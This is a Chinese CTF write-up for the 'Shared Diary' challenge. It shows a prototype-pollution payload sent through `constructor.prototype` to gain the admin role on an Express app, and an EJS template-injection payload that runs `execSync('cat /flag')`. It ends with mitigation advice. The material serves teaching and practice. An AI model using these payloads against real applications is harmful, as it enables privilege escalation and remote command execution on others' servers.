# Shared Diary

## 题目简述

题目是一个 Node.js Express 日记站。登录接口用自定义 `merge` 函数把 JSON 请求体合并到普通对象中，只拦截了 `__proto__`；日记内容又被直接拼进 `ejs.render()`。目标是先通过原型链污染取得管理员身份，再利用 EJS 服务端模板注入读取 `/flag`。

## 解题过程

### 绕过 `__proto__` 检查

关键合并函数为：

```javascript
function merge(target, source) {
    for (const key in source) {
        if (key === "__proto__") {
            throw new Error("Detected Prototype Pollution");
        }
        if (key in source && key in target) {
            merge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
}
```

仅禁止 `__proto__` 并不能阻断通往 `Object.prototype` 的另一条路径。普通对象的 `constructor` 指向 `Object`，其 `prototype` 就是 `Object.prototype`，因此可以使用 `constructor.prototype` 写入继承属性：

```http
POST /login HTTP/1.1
Host: challenge.example
Content-Type: application/json

{
  "username": "ek1ng",
  "password": "123",
  "constructor": {
    "prototype": {
      "role": "admin"
    }
  }
}
```

合并结束后，虽然新建对象没有自有的 `role` 字段，但读取 `data.role` 时会沿原型链得到 `admin`，从而让会话通过管理员检查。污染已经发生后，不宜再发送无关登录请求：这个递归 `merge` 会遍历继承属性，后续合并可能异常，表现为页面一直提示检测到污染。

### 利用 EJS 模板注入

管理员页面把用户提交的日记直接放进新的 EJS 模板：

```javascript
const diary = ejs.render(`<div>${req.body.diary}</div>`);
```

因此提交 EJS 原始输出标签即可执行服务端 JavaScript：

```ejs
<%- global.process.mainModule.require('child_process').execSync('cat /flag').toString() %>
```

页面渲染后得到：

```text
hgame{N0tice_prototype_pollution&&EJS_server_template_injection}
```

官方题解还给出了一步式思路：除 `role` 外，同时污染 EJS 的 `client` 和 `escapeFunction` 选项，使 EJS 在编译模板时直接执行注入语句。该路线本质仍是同一条漏洞链，只是把第二阶段从日记正文移到了 EJS 的编译选项中。

## 方法总结

原型链污染防护不能只过滤 `__proto__`，还应拒绝 `constructor`、`prototype` 等危险键，并避免把不可信对象递归合并到普通对象。模板层则不应把用户输入重新当作 EJS 源码编译；应把日记作为数据变量传入固定模板并依赖默认转义。两处问题单独看分别是权限绕过和模板注入，串联后即可完成远程命令执行。
